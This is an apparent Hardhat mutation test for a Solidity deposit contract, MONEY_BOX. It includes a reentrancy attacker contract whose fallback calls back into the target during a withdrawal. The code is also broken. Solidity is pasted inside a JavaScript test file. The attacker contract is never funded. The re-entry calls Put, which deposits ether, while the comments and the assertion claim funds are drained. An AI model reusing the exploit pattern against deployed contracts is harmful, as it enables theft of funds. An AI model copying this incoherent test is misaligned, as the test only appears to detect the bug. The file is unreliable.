import { expect } from "chai";
import { ethers } from "hardhat";

describe("MONEY_BOX mutant m8ab25c95 detection", function () {
    it("should detect missing nonReentrant modifier on Put by exploiting reentrancy", async function () {
        const [owner, attacker] = await ethers.getSigners();
        
        // Deploy MONEY_BOX (no constructor arguments needed)
        const MoneyBoxFactory = await ethers.getContractFactory("MONEY_BOX");
        const moneyBox = await MoneyBoxFactory.deploy();
        await moneyBox.waitForDeployment();
        
        // Deploy attacker contract
        const AttackerFactory = await ethers.getContractFactory("ReentrancyAttacker");
        const attackerContract = await AttackerFactory.deploy(await moneyBox.getAddress());
        await attackerContract.waitForDeployment();
        
        // Setup: fund the moneyBox so it can send ether
        // First, send ether via Put to create a balance for the attacker contract
        await moneyBox.connect(attacker).Put(0, { value: ethers.parseEther("10") });
        
        // Set MinSum to 1 wei so Collect can succeed
        await moneyBox.SetMinSum(1);
        
        // Initialize the contract (required by SetMinSum)
        await moneyBox.Initialized();
        
        // Now the attacker contract has balance >= MinSum and can call Collect
        // The attacker contract will attempt reentrancy via its fallback
        
        // Expect the transaction to revert on the original (non-mutant) due to nonReentrant
        // But on the mutant, it will succeed, draining funds
        // We check that the reentrancy attack succeeds (mutant behavior)
        const initialBalance = await ethers.provider.getBalance(await moneyBox.getAddress());
        
        // Trigger the attack - this should revert on original but succeed on mutant
        await attackerContract.connect(attacker).attack(ethers.parseEther("5"));
        
        // On mutant: after attack, moneyBox should have lost more than the requested amount
        // due to reentrancy (multiple Put calls during Collect)
        const finalBalance = await ethers.provider.getBalance(await moneyBox.getAddress());
        
        // Verify that the attack drained more than the legitimate withdrawal
        // This confirms the reentrancy guard was missing
        expect(initialBalance - finalBalance).to.be.gt(ethers.parseEther("5"));
    });
});

// Attacker contract to exploit reentrancy
contract ReentrancyAttacker {
    address payable target;
    
    constructor(address payable _target) {
        target = _target;
    }
    
    function attack(uint amount) external {
        // Call Collect on MONEY_BOX which will send ether to this contract
        // triggering fallback which calls Put(0) again
        (bool success, ) = target.call(abi.encodeWithSignature("Collect(uint256)", amount));
        require(success);
    }
    
    fallback() external payable {
        // Reenter by calling Put - on mutant this will succeed, on original it will revert
        if (address(target).balance >= msg.value) {
            (bool success, ) = target.call{value: msg.value}(abi.encodeWithSignature("Put(uint256)", 0));
            success; // suppress warning
        }
    }
}